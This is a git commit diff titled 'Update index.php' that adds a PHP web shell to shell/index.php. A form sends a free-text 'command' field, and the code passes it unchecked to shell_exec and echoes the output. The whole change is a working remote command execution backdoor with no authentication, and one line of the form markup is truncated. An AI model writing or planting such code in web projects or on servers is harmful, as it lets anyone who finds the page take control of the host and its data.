ea146b2004882b921b9a9f47bae2da58726a439f
Ryan Dewantoro <riiean@umsida.ac.id>
2020-11-25 14:39:33 +0700

    Update index.php

--- shell/index.php
+++ shell/index.php
@@ -1,3 +1,13 @@
+<form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]);?>" method="pos$
+command : <input type="text" name="command">
+<input type="submit">
+</form>
+
 <?php
-shell_exec('sh setup.sh');
+
+$command = $_POST['command'];
+echo "<pre>";
+echo shell_exec($command);
+echo "</pre>";
+
 ?>
